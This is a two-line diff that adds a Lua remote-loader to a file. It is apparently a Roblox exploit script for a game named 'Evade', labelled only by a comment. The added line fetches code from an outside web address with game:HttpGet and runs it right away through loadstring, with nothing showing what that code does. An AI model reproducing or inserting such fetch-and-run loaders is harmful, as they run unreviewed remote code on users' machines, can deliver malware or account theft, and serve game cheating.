@@ -1,0 +1,2 @@
+-- evade
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/df36aad55a79486b87749260dd822ace"))()
